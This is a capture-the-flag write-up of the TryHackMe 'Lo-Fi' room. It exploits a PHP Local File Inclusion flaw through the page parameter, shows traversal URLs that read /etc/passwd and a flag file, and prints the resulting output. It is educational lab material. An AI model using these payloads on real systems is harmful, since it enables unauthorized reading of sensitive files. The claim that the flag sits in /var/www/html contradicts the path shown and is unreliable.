---
title: "TryHackMe: Lo-Fi"
author: Vitorx
categories: [TryHackMe]
tags: [LFI, web, File Inclusion]
render_with_liquid: false
img_path: /images/tryhackme_lo-fi/
image:
  path: /images/tryhackme_lo-fi/lofi_image.webp
---

The **Lo-Fi** challenge on TryHackMe is a CTF where you explore a vulnerable machine by exploiting a Local File Inclusion (LFI) vulnerability to capture flags, while practicing core ethical hacking skills. You can access it by clicking [here](https://tryhackme.com/room/lofi).

## Capture the flag

Our goal is to access the web application and read the flag located at the root of the file system.

Upon visiting the website http://10.10.152.81/, we found links to YouTube videos.

![Web 80 Index](/images/tryhackme_lo-fi/lofi-paginaInicial.webp){: width="1200" height="600"}

Upon further analysis, we realized that the video pages are dynamically loaded via the parameter `/?page=`.

![Web 80 Index](/images/tryhackme_lo-fi/lofi-paginaSecundaria.webp){: width="1200" height="600"}

The `page` parameter in the provided code is vulnerable to `Local File Inclusion (LFI)` due to improper handling of user input. This parameter allows dynamic inclusion of files, such as `/?page=relax.php`, creating an entry point for exploitation if the input is not properly sanitized.

This suggests that the backend likely uses a PHP function like include($_GET['page']); to dynamically include content. If there is no proper validation, an attacker can manipulate this parameter to access sensitive files on the server, such as:

/etc/passwd para informações de usuários do sistema. \
/var/www/html/config.php para credenciais da aplicação. \
/root/root.txt ou flag.txt para a flag da sala.

By using directory traversal `(with ../)`, it is possible to escalate access and read arbitrary files on the server.

Let’s try accessing the /etc/passwd file with LFI:

`http://lo-fi.thm/?page=../../../../etc/passwd`

![Web 80 Index](/images/tryhackme_lo-fi/lofi-etc.webp){: width="1200" height="600"}

The returned content will look something like this:

```console
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh 
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
```
We can see that the root user is in the /etc/passwd file. Now, let's look for the flag inside it:

![Web 80 Index](/images/tryhackme_lo-fi/lofi-flag.webp){: width="1200" height="600"}

The flag was found at: `http://lo-fi.thm/?page=../../../flag.txt`

This confirms that the flag was located in /var/www/html.

## Conclusion

In this exploration, we used several techniques to exploit a Local File Inclusion (LFI) vulnerability:

✅ Identified the vulnerability by analyzing the /?page= parameter; \
✅ Manipulated the page parameter to traverse directories and access sensitive files; \
✅ Retrieved the /etc/passwd file to find information about system users; \
✅ Exploited directory traversal to locate and capture the flag inside /var/www/html/flag.txt.

This exercise highlights the importance of properly sanitizing user inputs to prevent LFI vulnerabilities, which can allow an attacker to read sensitive files and escalate privileges.
